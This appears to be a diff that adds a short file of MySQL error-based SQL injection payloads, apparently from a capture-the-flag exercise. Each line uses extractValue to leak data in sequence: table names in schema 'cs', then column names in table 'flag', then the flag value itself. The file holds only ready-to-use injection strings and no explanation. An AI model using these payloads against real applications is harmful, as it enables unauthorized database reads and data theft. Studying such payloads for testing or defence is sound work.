@@ -1,0 +1,3 @@
+%' and extractValue(null, concat(0x0a, (select table_name from information_schema.tables where table_schema='cs' limit 1,2))); -- -
+%' and extractValue(null, concat(0x0a, (select column_name from information_schema.columns where table_name='flag' limit 1,2))); -- -
+%' and extractValue(null, concat(0x0a, (select name from flag))); -- -
